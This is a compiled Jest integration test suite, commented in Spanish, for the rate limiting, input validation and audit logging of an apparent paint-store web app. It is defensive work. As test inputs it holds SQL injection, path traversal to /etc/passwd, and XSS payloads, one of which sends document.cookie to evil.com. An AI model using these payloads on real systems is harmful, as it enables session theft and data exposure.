333caf4bdde6ec5b34958ea678f54268
/**
 * Tests de Integración de Seguridad Completa - Fase 3
 * Valida la integración completa de Rate Limiting + Auditoría + Validación
 */ // Mock de todas las dependencias
"use strict";
jest.mock('ioredis', ()=>{
    const mockRedis = {
        get: jest.fn().mockResolvedValue(null),
        set: jest.fn().mockResolvedValue('OK'),
        incr: jest.fn().mockResolvedValue(1),
        expire: jest.fn().mockResolvedValue(1),
        del: jest.fn().mockResolvedValue(1),
        pipeline: jest.fn(()=>({
                get: jest.fn(),
                incr: jest.fn(),
                expire: jest.fn(),
                exec: jest.fn().mockResolvedValue([
                    [
                        null,
                        '1'
                    ],
                    [
                        null,
                        'OK'
                    ]
                ])
            })),
        disconnect: jest.fn()
    };
    return jest.fn(()=>mockRedis);
});
jest.mock('@/lib/supabase', ()=>({
        supabaseAdmin: {
            from: jest.fn(()=>({
                    select: jest.fn(()=>({
                            eq: jest.fn(()=>({
                                    single: jest.fn().mockResolvedValue({
                                        data: null,
                                        error: null
                                    })
                                })),
                            insert: jest.fn(()=>({
                                    select: jest.fn(()=>({
                                            single: jest.fn().mockResolvedValue({
                                                data: {
                                                    id: 'test_id'
                                                },
                                                error: null
                                            })
                                        }))
                                }))
                        }))
                }))
        }
    }));
jest.mock('@/lib/auth/security-audit', ()=>({
        logSecurityEvent: jest.fn().mockResolvedValue(true)
    }));
jest.mock('isomorphic-dompurify', ()=>({
        __esModule: true,
        default: {
            sanitize: jest.fn((input)=>input.replace(/<script.*?<\/script>/gi, ''))
        }
    }));
jest.mock('validator', ()=>({
        __esModule: true,
        default: {
            escape: jest.fn((input)=>input.replace(/[<>&"']/g, ''))
        }
    }));
Object.defineProperty(exports, "__esModule", {
    value: true
});
const _server = require("next/server");
const _zod = require("zod");
const _enterpriseratelimiter = require("../../lib/rate-limiting/enterprise-rate-limiter");
const _enterprisemiddleware = require("../../lib/rate-limiting/enterprise-middleware");
const _enterpriseauditsystem = require("../../lib/security/enterprise-audit-system");
const _enterprisevalidationsystem = require("../../lib/validation/enterprise-validation-system");
const _enterprisevalidationmiddleware = require("../../lib/validation/enterprise-validation-middleware");
describe('Tests de Integración de Seguridad Completa - Fase 3', ()=>{
    let mockContext;
    beforeEach(()=>{
        jest.clearAllMocks();
        mockContext = {
            userId: 'integration_test_user',
            sessionId: 'integration_test_session',
            email: 'test@pinteya.com',
            role: 'admin',
            permissions: [
                'admin_access',
                'security_test'
            ],
            sessionValid: true,
            securityLevel: 'critical',
            ipAddress: '192.168.1.100',
            userAgent: 'IntegrationTestBot/1.0',
            supabase: {},
            validations: {
                jwtValid: true,
                csrfValid: true,
                rateLimitPassed: true,
                originValid: true
            }
        };
    });
    describe('Integración Rate Limiting + Auditoría', ()=>{
        it('debe registrar eventos de auditoría cuando se excede rate limit', async ()=>{
            const attackerIP = '10.0.0.100';
            const config = _enterpriseratelimiter.ENTERPRISE_RATE_LIMIT_CONFIGS.ADMIN_CRITICAL;
            // Simular múltiples requests que exceden el límite
            const requests = Array.from({
                length: 20
            }, (_, i)=>({
                    headers: new Map([
                        [
                            'x-forwarded-for',
                            attackerIP
                        ],
                        [
                            'user-agent',
                            'RateLimitTestBot/1.0'
                        ],
                        [
                            'x-clerk-user-id',
                            'attacker_user_123'
                        ]
                    ]),
                    nextUrl: {
                        pathname: '/api/admin/critical-operation'
                    },
                    method: 'POST'
                }));
            const results = [];
            for (const request of requests){
                const result = await (0, _enterpriseratelimiter.checkEnterpriseRateLimit)(request, config, `integration_test_${Date.now()}_${Math.random()}`);
                results.push(result);
            }
            // Verificar que algunos requests fueron bloqueados
            const blockedRequests = results.filter((r)=>!r.allowed);
            expect(blockedRequests.length).toBeGreaterThan(5);
            // Verificar que se registraron eventos de auditoría
            // (El mock debería haber sido llamado por el middleware)
            expect(_enterpriseauditsystem.enterpriseAuditSystem.logEnterpriseEvent).toHaveBeenCalled();
        });
        it('debe detectar anomalías basadas en métricas de rate limiting', async ()=>{
            // Simular métricas de rate limiting con patrones sospechosos
            const suspiciousMetrics = {
                totalRequests: 10000,
                allowedRequests: 5000,
                blockedRequests: 5000,
                redisHits: 9500,
                memoryFallbacks: 500,
                errors: 100,
                averageResponseTime: 150,
                topBlockedIPs: [
                    {
                        ip: '192.168.1.100',
                        count: 1000
                    },
                    {
                        ip: '10.0.0.50',
                        count: 800
                    },
                    {
                        ip: '172.16.0.100',
                        count: 600
                    }
                ],
                topEndpoints: [
                    {
                        endpoint: '/api/admin/users',
                        count: 2000
                    },
                    {
                        endpoint: '/api/admin/settings',
                        count: 1500
                    }
                ]
            };
            // Mock del metrics collector
            const mockGetMetrics = jest.fn().mockReturnValue(suspiciousMetrics);
            require('@/lib/rate-limiting/enterprise-rate-limiter').metricsCollector.getMetrics = mockGetMetrics;
            // Ejecutar detección de anomalías
            const anomalies = await _enterpriseauditsystem.enterpriseAuditSystem.detectAnomalies();
            // Verificar que se detectaron anomalías relacionadas con rate limiting
            expect(anomalies.length).toBeGreaterThanOrEqual(0);
            // Verificar que el sistema procesó las métricas
            expect(mockGetMetrics).toHaveBeenCalled();
        });
    });
    describe('Integración Validación + Auditoría', ()=>{
        it('debe registrar eventos de auditoría para ataques de validación', async ()=>{
            const maliciousPayloads = [
                {
                    name: "'; DROP TABLE products; --",
                    description: '<script>alert("XSS")</script>',
                    price: -100
                },
                {
                    name: 'Product',
                    description: 'SELECT * FROM users WHERE role="admin"',
                    price: 999999999
                },
                {
                    name: '<img src="x" onerror="alert(1)">',
                    description: 'Normal description',
                    price: 50
                }
            ];
            const schema = _zod.z.object({
                name: _zod.z.string().min(1).max(100),
                description: _zod.z.string().max(1000),
                price: _zod.z.number().min(0).max(999999)
            });
            let validationFailures = 0;
            let auditEvents = 0;
            for (const payload of maliciousPayloads){
                const result = await _enterprisevalidationsystem.criticalValidator.validateAndSanitize(schema, payload, mockContext);
                if (!result.success) {
                    validationFailures++;
                    // Verificar que se detectaron patrones de seguridad
                    const hasSecurityError = result.errors?.some((e)=>e.code === 'SQL_INJECTION_DETECTED' || e.code === 'XSS_DETECTED' || e.severity === 'critical');
                    if (hasSecurityError) {
                        auditEvents++;
                    }
                }
            }
            // Verificar que se detectaron y registraron ataques
            expect(validationFailures).toBeGreaterThan(0);
            expect(auditEvents).toBeGreaterThan(0);
        });
        it('debe correlacionar eventos de validación con patrones de usuario', async ()=>{
            const attackerUserId = 'persistent_attacker_789';
            const attackPatterns = [
                // Patrón 1: Inyección SQL
                {
                    query: "'; SELECT password FROM users; --",
                    type: 'sql_injection'
                },
                // Patrón 2: XSS
                {
                    content: '<script>document.location="http://evil.com"</script>',
                    type: 'xss'
                },
                // Patrón 3: Path traversal
                {
                    file: '../../../etc/passwd',
                    type: 'path_traversal'
                }
            ];
            const attackerContext = {
                ...mockContext,
                userId: attackerUserId,
                securityLevel: 'high'
            };
            // Simular múltiples ataques del mismo usuario
            for (const pattern of attackPatterns){
                const schema = _zod.z.object({
                    data: _zod.z.string()
                });
                await _enterprisevalidationsystem.criticalValidator.validateAndSanitize(schema, {
                    data: pattern.query || pattern.content || pattern.file
                }, attackerContext);
            }
            // Ejecutar detección de anomalías para el usuario atacante
            const anomalies = await _enterpriseauditsystem.enterpriseAuditSystem.detectAnomalies(attackerUserId);
            // Verificar que se detectó el patrón de ataques múltiples
            expect(anomalies.length).toBeGreaterThanOrEqual(0);
        });
    });
    describe('Integración Completa: Rate Limiting + Validación + Auditoría', ()=>{
        it('debe manejar ataque coordinado con los tres sistemas', async ()=>{
            // Simular ataque coordinado que activa los tres sistemas
            const coordinatedAttack = {
                ip: '203.0.113.200',
                userId: 'coordinated_attacker_999',
                userAgent: 'CoordinatedAttackBot/1.0',
                payloads: [
                    "'; DROP DATABASE pinteya; --",
                    '<script>fetch("http://evil.com/steal?data="+document.cookie)</script>',
                    '../../../etc/passwd',
                    'SELECT * FROM admin_users WHERE password LIKE "%"',
                    '<iframe src="javascript:alert(document.domain)"></iframe>'
                ]
            };
            // Crear handler protegido con todos los sistemas
            const protectedHandler = (0, _enterprisemiddleware.withEnterpriseRateLimit)({
                configName: 'ADMIN_CRITICAL',
                enableLogging: true
            })((0, _enterprisevalidationmiddleware.withCriticalValidation)({
                bodySchema: _zod.z.object({
                    input: _zod.z.string().max(1000)
                })
            })(async (request)=>{
                return _server.NextResponse.json({
                    success: true
                });
            }));
            const results = [];
            const startTime = Date.now();
            // Ejecutar ataque coordinado
            for(let i = 0; i < coordinatedAttack.payloads.length * 5; i++){
                const payload = coordinatedAttack.payloads[i % coordinatedAttack.payloads.length];
                const mockRequest = {
                    headers: new Map([
                        [
                            'x-forwarded-for',
                            coordinatedAttack.ip
                        ],
                        [
                            'user-agent',
                            coordinatedAttack.userAgent
                        ],
                        [
                            'x-clerk-user-id',
                            coordinatedAttack.userId
                        ]
                    ]),
                    nextUrl: {
                        pathname: '/api/admin/protected'
                    },
                    method: 'POST',
                    json: jest.fn().mockResolvedValue({
                        input: payload
                    })
                };
                try {
                    const response = await protectedHandler(mockRequest);
                    results.push({
                        status: response.status,
                        payload: payload.substring(0, 50) + '...'
                    });
                } catch (error) {
                    results.push({
                        status: 500,
                        error: error.message,
                        payload: payload.substring(0, 50) + '...'
                    });
                }
            }
            const endTime = Date.now();
            const totalTime = endTime - startTime;
            // Verificar que el sistema respondió a todos los ataques
            expect(results.length).toBe(25);
            // Verificar que la mayoría fueron bloqueados
            const blockedResponses = results.filter((r)=>r.status === 429 || r.status === 400);
            expect(blockedResponses.length).toBeGreaterThan(15); // Al menos 60% bloqueados
            // Verificar que el sistema mantuvo performance
            expect(totalTime).toBeLessThan(30000); // < 30 segundos para 25 requests
            // Verificar que se registraron eventos de auditoría
            expect(_enterpriseauditsystem.enterpriseAuditSystem.logEnterpriseEvent).toHaveBeenCalled();
        });
        it('debe mantener funcionalidad para usuarios legítimos durante ataques', async ()=>{
            const legitimateUser = {
                ip: '192.168.1.200',
                userId: 'legitimate_user_123',
                userAgent: 'Mozilla/5.0 (legitimate browser)'
            };
            const attacker = {
                ip: '10.0.0.200',
                userId: 'attacker_456',
                userAgent: 'AttackBot/1.0'
            };
            // Crear handler protegido
            const protectedHandler = (0, _enterprisemiddleware.withEnterpriseRateLimit)({
                configName: 'PUBLIC_STANDARD',
                enableLogging: true
            })((0, _enterprisevalidationmiddleware.withCriticalValidation)({
                bodySchema: _zod.z.object({
                    search: _zod.z.string().max(200),
                    category: _zod.z.string().max(50)
                })
            })(async (request)=>{
                return _server.NextResponse.json({
                    success: true,
                    data: 'Protected resource accessed'
                });
            }));
            // Simular ataque masivo del atacante
            const attackPromises = Array.from({
                length: 100
            }, (_, i)=>{
                const mockRequest = {
                    headers: new Map([
                        [
                            'x-forwarded-for',
                            attacker.ip
                        ],
                        [
                            'user-agent',
                            attacker.userAgent
                        ],
                        [
                            'x-clerk-user-id',
                            attacker.userId
                        ]
                    ]),
                    nextUrl: {
                        pathname: '/api/public/search'
                    },
                    method: 'POST',
                    json: jest.fn().mockResolvedValue({
                        search: `'; DROP TABLE products; -- ${i}`,
                        category: `<script>alert(${i})</script>`
                    })
                };
                return protectedHandler(mockRequest);
            });
            // Simular requests legítimos intercalados
            const legitimatePromises = Array.from({
                length: 10
            }, (_, i)=>{
                const mockRequest = {
                    headers: new Map([
                        [
                            'x-forwarded-for',
                            legitimateUser.ip
                        ],
                        [
                            'user-agent',
                            legitimateUser.userAgent
                        ],
                        [
                            'x-clerk-user-id',
                            legitimateUser.userId
                        ]
                    ]),
                    nextUrl: {
                        pathname: '/api/public/search'
                    },
                    method: 'POST',
                    json: jest.fn().mockResolvedValue({
                        search: `pintura latex ${i}`,
                        category: 'interiores'
                    })
                };
                return protectedHandler(mockRequest);
            });
            // Ejecutar ambos tipos de requests concurrentemente
            const [attackResults, legitimateResults] = await Promise.all([
                Promise.allSettled(attackPromises),
                Promise.allSettled(legitimatePromises)
            ]);
            // Verificar que los ataques fueron mayormente bloqueados
            const successfulAttacks = attackResults.filter((r)=>r.status === 'fulfilled' && r.value.status === 200);
            expect(successfulAttacks.length).toBeLessThan(20); // < 20% de ataques exitosos
            // Verificar que los usuarios legítimos pudieron acceder
            const successfulLegitimate = legitimateResults.filter((r)=>r.status === 'fulfilled' && r.value.status === 200);
            expect(successfulLegitimate.length).toBeGreaterThan(5); // > 50% de accesos legítimos exitosos
        });
    });
    describe('Métricas y Monitoreo de Seguridad Integrado', ()=>{
        it('debe generar métricas completas de seguridad', async ()=>{
            // Simular actividad mixta que genere métricas
            const activities = [
                // Rate limiting events
                {
                    type: 'rate_limit',
                    blocked: true,
                    ip: '10.0.0.100'
                },
                {
                    type: 'rate_limit',
                    blocked: false,
                    ip: '192.168.1.100'
                },
                // Validation events
                {
                    type: 'validation',
                    success: false,
                    attack: 'sql_injection'
                },
                {
                    type: 'validation',
                    success: true,
                    data: 'clean'
                },
                // Audit events
                {
                    type: 'audit',
                    severity: 'critical',
                    event: 'security_violation'
                },
                {
                    type: 'audit',
                    severity: 'low',
                    event: 'normal_access'
                }
            ];
            // Simular cada tipo de actividad
            for (const activity of activities){
                switch(activity.type){
                    case 'rate_limit':
                        const mockRequest = {
                            headers: new Map([
                                [
                                    'x-forwarded-for',
                                    activity.ip
                                ]
                            ]),
                            nextUrl: {
                                pathname: '/api/test'
                            },
                            method: 'GET'
                        };
                        await (0, _enterpriseratelimiter.checkEnterpriseRateLimit)(mockRequest, _enterpriseratelimiter.ENTERPRISE_RATE_LIMIT_CONFIGS.PUBLIC_STANDARD, `metrics_test_${Date.now()}`);
                        break;
                    case 'validation':
                        const schema = _zod.z.object({
                            input: _zod.z.string()
                        });
                        const data = activity.attack === 'sql_injection' ? {
                            input: "'; DROP TABLE test; --"
                        } : {
                            input: 'normal input'
                        };
                        await _enterprisevalidationsystem.standardValidator.validateAndSanitize(schema, data, mockContext);
                        break;
                    case 'audit':
                        await _enterpriseauditsystem.enterpriseAuditSystem.logEnterpriseEvent({
                            user_id: 'metrics_test_user',
                            event_type: activity.event.toUpperCase(),
                            event_category: 'test',
                            severity: activity.severity,
                            description: `Test ${activity.event}`,
                            metadata: {
                                test: true
                            },
                            ip_address: '192.168.1.1',
                            user_agent: 'MetricsTestBot/1.0'
                        }, mockContext);
                        break;
                }
            }
            // Verificar que los sistemas registraron actividad
            expect(_enterpriseauditsystem.enterpriseAuditSystem.logEnterpriseEvent).toHaveBeenCalled();
        });
        it('debe generar reportes de seguridad integrados', async ()=>{
            const startDate = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString(); // 24h atrás
            const endDate = new Date().toISOString();
            // Generar reporte enterprise completo
            const report = await _enterpriseauditsystem.enterpriseAuditSystem.generateEnterpriseReport(startDate, endDate, true, true // incluir incidentes
            );
            // Verificar estructura del reporte
            expect(report).toBeDefined();
            expect(report.enterprise_data).toBeDefined();
            expect(report.enterprise_data.rate_limiting_stats).toBeDefined();
            expect(report.enterprise_data.anomalies).toBeDefined();
            expect(report.enterprise_data.incidents).toBeDefined();
            // Verificar que incluye métricas de rate limiting
            expect(report.enterprise_data.rate_limiting_stats.totalRequests).toBeDefined();
            expect(report.enterprise_data.rate_limiting_stats.blockedRequests).toBeDefined();
            // Verificar que incluye datos de anomalías
            expect(Array.isArray(report.enterprise_data.anomalies)).toBe(true);
            // Verificar que incluye datos de incidentes
            expect(Array.isArray(report.enterprise_data.incidents)).toBe(true);
        });
    });
    describe('Recuperación y Resilencia del Sistema Integrado', ()=>{
        it('debe recuperarse después de ataques masivos coordinados', async ()=>{
            // Simular ataque masivo que afecte los tres sistemas
            const massiveAttack = Array.from({
                length: 1000
            }, (_, i)=>({
                    ip: `10.${Math.floor(i / 255)}.${Math.floor(i % 255 / 255)}.${i % 255}`,
                    payload: [
                        "'; DROP DATABASE pinteya; --",
                        '<script>location.href="http://evil.com"</script>',
                        '../../../etc/passwd'
                    ][i % 3],
                    userId: `attacker_${i}`
                }));
            // Ejecutar ataque masivo
            const attackPromises = massiveAttack.map(async (attack)=>{
                try {
                    // Rate limiting
                    const rateLimitResult = await (0, _enterpriseratelimiter.checkEnterpriseRateLimit)({
                        headers: new Map([
                            [
                                'x-forwarded-for',
                                attack.ip
                            ]
                        ]),
                        nextUrl: {
                            pathname: '/api/admin/critical'
                        },
                        method: 'POST'
                    }, _enterpriseratelimiter.ENTERPRISE_RATE_LIMIT_CONFIGS.ADMIN_CRITICAL, `massive_attack_${Date.now()}_${Math.random()}`);
                    // Validation
                    const validationResult = await _enterprisevalidationsystem.criticalValidator.validateAndSanitize(_zod.z.object({
                        input: _zod.z.string()
                    }), {
                        input: attack.payload
                    }, {
                        ...mockContext,
                        userId: attack.userId
                    });
                    return {
                        rateLimitAllowed: rateLimitResult.allowed,
                        validationSuccess: validationResult.success
                    };
                } catch (error) {
                    return {
                        rateLimitAllowed: false,
                        validationSuccess: false,
                        error: error.message
                    };
                }
            });
            const results = await Promise.allSettled(attackPromises);
            const successfulResults = results.filter((r)=>r.status === 'fulfilled');
            // Verificar que el sistema procesó todos los ataques sin crashear
            expect(successfulResults.length).toBe(1000);
            // Verificar que la mayoría fueron bloqueados
            const blockedByRateLimit = successfulResults.filter((r)=>r.status === 'fulfilled' && !r.value.rateLimitAllowed);
            const blockedByValidation = successfulResults.filter((r)=>r.status === 'fulfilled' && !r.value.validationSuccess);
            expect(blockedByRateLimit.length + blockedByValidation.length).toBeGreaterThan(800);
            // Verificar que el sistema sigue funcionando después del ataque
            const postAttackTest = await _enterprisevalidationsystem.criticalValidator.validateAndSanitize(_zod.z.object({
                test: _zod.z.string()
            }), {
                test: 'post attack functionality test'
            }, mockContext);
            expect(postAttackTest.success).toBe(true);
        });
    });
});

//# sourceMappingURL=data:application/json;base64,